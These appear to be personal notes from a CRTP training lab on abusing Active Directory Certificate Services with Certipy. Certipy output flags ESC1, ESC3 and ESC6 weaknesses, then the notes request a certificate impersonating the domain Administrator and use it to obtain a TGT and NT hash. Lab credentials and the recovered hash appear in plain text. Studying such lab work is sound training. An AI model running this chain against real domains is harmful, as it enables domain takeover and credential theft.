- Enumeration
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy find -u 'student303@dollarcorp.moneycorp.local' -p a5fdNPDwScrD7T2A -vulnerable -enabled -dc-ip 172.16.2.1 -stdout
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 15 enabled certificate templates
[*] Trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'moneycorp-MCORP-DC-CA'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-512'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-519'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-500'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : moneycorp-MCORP-DC-CA
    DNS Name                            : mcorp-dc.moneycorp.local
    Certificate Subject                 : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Certificate Serial Number           : 48D51C5ED50124AF43DB7A448BF68C49
    Certificate Validity Start          : 2022-11-26 09:59:16+00:00
    Certificate Validity End            : 2032-11-26 10:09:15+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled                                                                                                                                                                                           
    Permissions                                                                                                                                                                                                                             
      Owner                             : DOLLARCORP.MONEYCORP.LOCAL\Administrators                                                                                                                                                         
      Access Rights                                                                                                                                                                                                                         
        ManageCa                        : DOLLARCORP.MONEYCORP.LOCAL\Administrators                                                                                                                                                         
                                          S-1-5-21-335606122-960912869-3279953914-512                                                                                                                                                       
                                          S-1-5-21-335606122-960912869-3279953914-519                                                                                                                                                       
        ManageCertificates              : DOLLARCORP.MONEYCORP.LOCAL\Administrators                                                                                                                                                         
                                          S-1-5-21-335606122-960912869-3279953914-512                                                                                                                                                       
                                          S-1-5-21-335606122-960912869-3279953914-519                                                                                                                                                       
        Enroll                          : DOLLARCORP.MONEYCORP.LOCAL\Authenticated Users                                                                                                                                                    
    [!] Vulnerabilities                                                                                                                                                                                                                     
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022                                                                                                   
Certificate Templates                                                                                                                                                                                                                       
  0                                                                                                                                                                                                                                         
    Template Name                       : HTTPSCertificates                                                                                                                                                                                 
    Display Name                        : HTTPSCertificates                                                                                                                                                                                 
    Certificate Authorities             : moneycorp-MCORP-DC-CA                                                                                                                                                                             
    Enabled                             : True                                                                                                                                                                                              
    Client Authentication               : True                                                                                                                                                                                              
    Enrollment Agent                    : False                                                                                                                                                                                             
    Any Purpose                         : False                                                                                                                                                                                             
    Enrollee Supplies Subject           : True                                                                                                                                                                                              
    Certificate Name Flag               : EnrolleeSuppliesSubject                                                                                                                                                                           
    Enrollment Flag                     : IncludeSymmetricAlgorithms                                                                                                                                                                        
                                          PublishToDs                                                                                                                                                                                       
    Private Key Flag                    : ExportableKey                                                                                                                                                                                     
    Extended Key Usage                  : Client Authentication                                                                                                                                                                             
                                          Secure Email                                                                                                                                                                                      
                                          Encrypting File System                                                                                                                                                                            
    Requires Manager Approval           : False                                                                                                                                                                                             
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DOLLARCORP.MONEYCORP.LOCAL\RDP Users
                                          S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                           : S-1-5-21-335606122-960912869-3279953914-500
        Write Owner Principals          : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
        Write Dacl Principals           : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
        Write Property Principals       : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
    [!] Vulnerabilities
      ESC1                              : 'DOLLARCORP.MONEYCORP.LOCAL\\RDP Users' can enroll, enrollee supplies subject and template allows client authentication
  1
    Template Name                       : SmartCardEnrollment-Agent
    Display Name                        : SmartCardEnrollment-Agent
    Certificate Authorities             : moneycorp-MCORP-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DOLLARCORP.MONEYCORP.LOCAL\Domain Users
                                          S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                           : S-1-5-21-335606122-960912869-3279953914-500
        Write Owner Principals          : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
        Write Dacl Principals           : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
        Write Property Principals       : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
    [!] Vulnerabilities
      ESC3                              : 'DOLLARCORP.MONEYCORP.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set

```

```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy find -u 'student303@dollarcorp.moneycorp.local' -p a5fdNPDwScrD7T2A -vulnerable -enabled -dc-ip 172.16.2.1 -old-bloodhound
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 15 enabled certificate templates
[*] Trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'moneycorp-MCORP-DC-CA'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-500'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-512'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-519'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-498'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-516'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-553'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-515'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-513'
[*] Saved BloodHound data to '20230806211009_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @BloodHoundAD
```

- Exploitation
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy req -u 'student303@dollarcorp.moneycorp.local' -p a5fdNPDwScrD7T2A -target 'mcorp-dc.moneycorp.local' -ca 'moneycorp-mcorp-dc-ca' -template 'CA-Integration' -upn 'Administrator@moneycorp.local'
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 26
[*] Got certificate with UPN 'Administrator@moneycorp.local'
[*] Certificate object SID is 'S-1-5-21-335606122-960912869-3279953914-4103'
[*] Saved certificate and private key to 'administrator.pfx'
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'moneycorp.local' -dc-ip 172.16.1.1                                                        Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@dollarcorp.moneycorp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@moneycorp.local': aad3b435b51404eeaad3b435b51404ee:71d04f9d50ceb1f64de7a09f23e6dc4c
```